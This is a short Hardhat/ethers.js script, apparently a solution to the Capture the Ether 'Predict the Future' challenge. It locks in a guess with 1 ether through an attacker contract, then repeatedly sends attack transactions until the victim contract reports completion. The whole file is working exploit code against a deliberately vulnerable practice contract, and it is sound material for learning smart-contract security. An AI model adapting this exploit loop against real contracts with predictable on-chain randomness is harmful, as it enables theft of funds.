require("@nomiclabs/hardhat-ethers");
const { ethers } = require("hardhat");

async function main() {
  
    const victimaAddress = "0x78D8EA890F9614367a075e46acC4fDdD6f4832Ba"
    
    const Atacante = await ethers.getContractFactory("PredictTheFutureAttacker");
    // const atacanteSC = await Atacante.deploy(victimaAddress);
    const atacanteSC = Atacante.attach("0x858971467AC606E08e34DC0d08c1bcA052bc2922");

    const Victima = await ethers.getContractFactory("PredictTheFutureChallenge");
    const victimaSC = Victima.attach(victimaAddress);

    await atacanteSC.isDeployed;
    console.log("atacante SC deployed with address ", atacanteSC.address)
    
    const tx = await atacanteSC.lockInGuess(
      {value: ethers.utils.parseEther('1')}
      );
    console.log("lock in guess done!")
    
    await tx.wait(1);

    var succesfull = false
    while (!succesfull) {
      console.log("Trying to attack")
      try {
        var attackTx = await atacanteSC.attack(
            {
                gasPrice: ethers.utils.parseUnits('15','gwei'),  // to make it fast!
                gasLimit: 500000,
            }
        );

        // the try catch is to handle the revert in the attacker contract
        // wait for the tx to be minned. With the rever in the attacker SC
        // this will generate an error, that's the reason behind the try catch.
        var receipt = await attackTx.wait(1);
      } catch {
          console.log("Attack wasn't succesfull")
          // var guessTx = await atacanteSC.guess();
          // console.log("Guess answer: ", guessTx.value);
      }
      
      succesfull = await victimaSC.isComplete();
    };
    console.log("Attack succesfull")
    
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
